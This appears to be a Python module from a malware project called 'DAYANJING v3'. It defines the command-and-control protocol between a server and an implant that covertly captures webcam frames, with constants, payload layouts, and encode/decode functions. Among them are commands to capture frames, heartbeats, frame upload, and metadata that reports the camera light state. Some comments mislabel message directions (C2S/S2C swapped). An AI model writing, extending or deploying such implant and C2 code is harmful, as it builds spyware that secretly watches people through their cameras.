"""
DAYANJING v3 — C2 协议消息定义（13_c2_server/protocol）
=====================================================

消息类型与序列化格式。帧层由 00_crypto/frame.py 的 SealedEnvelope 承载，
本模块只定义 payload 结构。

消息方向：
  服务端 -> 植入端：
    CAPTURE_FRAME  (0x10)  采集指令
    HEARTBEAT_ACK  (0x11)  心跳响应
  植入端 -> 服务端：
    HEARTBEAT      (0x20)  心跳（携带拉取任务意图）
    FRAME_DATA     (0x21)  采集帧回传
    FRAME_META     (0x22)  帧元数据（灯光状态/失败原因）

设计约束（v3 §3）：
- payload 全部小端定长域，禁止长度前缀歧义
- 所有携带像素数据的帧必须经 GCM 密封，明文不出进程、不落盘
"""

import os
import struct
import time
from typing import Tuple

# ---------------------------------------------------------------------------
# 消息类型
# ---------------------------------------------------------------------------

# C2S (server -> implant)
MSG_CAPTURE_FRAME = 0x10
MSG_HEARTBEAT_ACK = 0x11
MSG_TASK_RESULT   = 0x12

# S2C (implant -> server)
MSG_HEARTBEAT     = 0x20
MSG_FRAME_DATA    = 0x21
MSG_FRAME_META    = 0x22

# 握手
MSG_HELLO         = 0x01
MSG_WELCOME       = 0x02
MSG_FINISHED      = 0x03

# 像素格式编码（与 camera.h cam_pixel_fmt_t 对应）
FMT_MJPEG   = 0x01
FMT_YUYV422 = 0x02
FMT_NV12    = 0x03
FMT_RGB24   = 0x04


# ---------------------------------------------------------------------------
# 编码
# ---------------------------------------------------------------------------

def encode_capture_frame(request_id: bytes, width: int, height: int,
                         flags: int = 0) -> bytes:
    """采集指令 payload。

    格式：request_id(16B) || flags(4B) || width(4B) || height(4B)
    """
    if len(request_id) != 16:
        raise ValueError("request_id must be 16 bytes")
    return (request_id
            + struct.pack("<I", flags)
            + struct.pack("<I", width)
            + struct.pack("<I", height))


def encode_heartbeat_ack(timestamp_us: int) -> bytes:
    """心跳响应 payload：timestamp_us(8B)"""
    return struct.pack("<Q", timestamp_us)


def encode_frame_meta(request_id: bytes, light_state: int, reason_code: int) -> bytes:
    """帧元数据 payload。

    request_id(16B) || light_state(1B) || reason_code(4B)
    light_state: 0=off/unknown, 1=on
    reason_code: 0=ok, 非 0 为错误码
    """
    if len(request_id) != 16:
        raise ValueError("request_id must be 16 bytes")
    return (request_id
            + struct.pack("<B", light_state)
            + struct.pack("<I", reason_code))


# ---------------------------------------------------------------------------
# 解码
# ---------------------------------------------------------------------------

def decode_capture_frame(payload: bytes) -> Tuple[bytes, int, int, int]:
    if len(payload) != 28:
        raise ValueError("capture_frame payload must be 28 bytes")
    request_id = payload[:16]
    flags, width, height = struct.unpack("<III", payload[16:28])
    return request_id, flags, width, height


def decode_heartbeat(payload: bytes) -> int:
    if len(payload) != 8:
        raise ValueError("heartbeat payload must be 8 bytes")
    return struct.unpack("<Q", payload)[0]


def decode_frame_data(payload: bytes) -> Tuple[bytes, int, bytes]:
    """帧回传 payload：request_id(16B) || format(4B) || data...

    注：尺寸信息在采集指令中已由服务端指定，此处不重复携带，
    避免 payload 膨胀（高分辨率帧可达 MiB 级）。
    """
    if len(payload) < 20:
        raise ValueError("frame_data payload too short")
    request_id = payload[:16]
    fmt = struct.unpack("<I", payload[16:20])[0]
    data = payload[20:]
    return request_id, fmt, data


def new_request_id() -> bytes:
    return os.urandom(16)


def now_us() -> int:
    return int(time.time() * 1_000_000)
